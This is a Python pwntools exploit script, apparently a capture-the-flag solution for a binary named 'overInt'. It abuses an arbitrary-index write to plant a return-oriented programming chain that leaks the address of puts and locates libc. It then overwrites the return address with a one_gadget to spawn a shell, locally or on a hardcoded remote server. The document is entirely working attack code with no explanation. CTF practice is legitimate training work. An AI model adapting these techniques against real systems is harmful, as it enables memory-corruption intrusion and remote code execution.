#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./overInt"
elf=ELF(pwn_file)
libc = elf.libc

if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("58.20.46.148",35272)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

payload = chr(6)+chr(78)+chr(17)+chr(115)
payload += chr(5)+chr(0)+chr(0)+chr(0)
payload += chr(0)*16+chr(0x72)+chr(0x33)+chr(0x63)+chr(0x20)

r.sendafter("Please set arrary number: \n", payload)


payload2 = chr(32) + chr(0)*3
debug()
r.sendafter("How many positions you want to modify?\n", payload2)

pos_start = 0x38
pop_rdi_ret = 0x400b13
puts = 0x400550
puts_pos = 0x602018
main = 0x40087F
payload3 = p64(pop_rdi_ret) + p64(puts_pos) + p64(puts) + p64(main)

for i in range(len(payload3)):
    r.sendafter("Which position you want to modify?\n", chr(i+pos_start) + chr(0)*3)
    r.sendafter("What content you want to write in?\n", payload3[i])

r.recvuntil("hello!")
w = r.recvline()[-7:-1]
puts_addr = u64(w + chr(0)*2)

libc.address = puts_addr - libc.sym['puts']
print hex(libc.address)


r.sendafter("Please set arrary number: \n", payload)
r.sendafter("How many positions you want to modify?\n", payload2)

one_gadget = libc.address + 0xf02a4

payload4 = p64(one_gadget)+ 'a'*24

for i in range(len(payload4)):
    r.sendafter("Which position you want to modify?\n", chr(i+pos_start) + chr(0)*3)
    r.sendafter("What content you want to write in?\n", payload4[i])



r.interactive()
